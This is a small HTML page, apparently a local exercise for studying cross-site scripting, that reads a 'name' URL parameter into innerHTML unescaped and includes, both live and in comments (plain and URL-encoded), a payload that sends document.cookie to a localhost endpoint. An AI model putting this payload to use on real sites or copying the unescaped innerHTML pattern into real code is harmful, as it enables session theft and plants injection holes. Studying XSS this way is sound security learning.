<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div>
        Welcome, <span id="username"></span>
    </div>
    <script>
        var img=document.createElement('img');
        img.src='http://127.0.0.1:5500/src/security/xss/vulnerability/exampl.html?data='+ document.cookie;
        + document.querySelector('body').appendChild(img);
        
        /* 
        encodeURIComponent("<img src=\"does-not-exist\" onerror=\"var img = document.createElement(\'img\'); img.src='http://127.0.0.1:5501/cookie?data=${document.cookie}'; document.querySelector(\'body\').appendChild(img);>")
        */
        /* 
        "%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3B%20img.src%3D'http%3A%2F%2F127.0.0.1%3A5501%2Fcookie%3Fdata%3D%24%7Bdocument.cookie%7D'%3B%20document.querySelector('body').appendChild(img)%3B%3E"
        */
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name');
        // console.log('Name is ', decodeURIComponent(name));
        // console.log('EncodedName is ', encodeURIComponent(name));
        document.getElementById('username').innerHTML = name;
    </script>
</body>

</html>